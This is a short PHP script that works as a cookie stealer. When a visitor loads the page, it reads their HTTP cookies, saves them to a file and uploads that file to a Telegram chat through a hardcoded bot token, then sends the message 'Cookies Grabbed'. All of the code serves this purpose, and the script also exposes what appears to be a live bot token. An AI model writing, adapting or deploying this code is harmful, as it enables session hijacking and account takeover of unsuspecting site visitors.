<?php
$cookies = $_SERVER['HTTP_COOKIE'];

$tele_token = "5618258723:AAEnMf0Ote1jgtEoKEaNstoWhepza9vprDo"; 
$tele_chat_id = "1376032111"; // Telegram chat Id
$cookie_file = "cookie.json"; // Path to the cookie file

function sendMessage($text, $tele_token, $tele_chat_id)
{
    $request_params = array(
        'chat_id' => $tele_chat_id,
        'text' => $text,
    );

    $request_url = 'https://api.telegram.org/bot' . $tele_token . '/sendMessage?' . http_build_query($request_params);

    $curl = curl_init(); // Create Curl Object
    curl_setopt($curl, CURLOPT_URL, $request_url); // Set Url
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); // Receive Content
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    $output = curl_exec($curl); // Execute
    $err = curl_error($curl);
    curl_close($curl); // Close Conn
    return $output;
}

// Check if cookies exist
if (!empty($cookies)) {
    // Save cookies to a file
    file_put_contents($cookie_file, $cookies);
    
    // Send the file to the telegram chat
    $url = 'https://api.telegram.org/bot' . $tele_token . '/sendDocument';
    $post_fields = array(
        'chat_id' => $tele_chat_id,
        'document' => new CURLFile(realpath($cookie_file))
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Type:multipart/form-data"
    ));
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    $output = curl_exec($ch);
    curl_close($ch);
    
    // Send a confirmation message
    sendMessage("Cookies Grabbed 😁", $tele_token, $tele_chat_id);
} else {
    // Cookies not found, send a message to the Telegram chat
    sendMessage("No cookies found 😔", $tele_token, $tele_chat_id);
}

?>
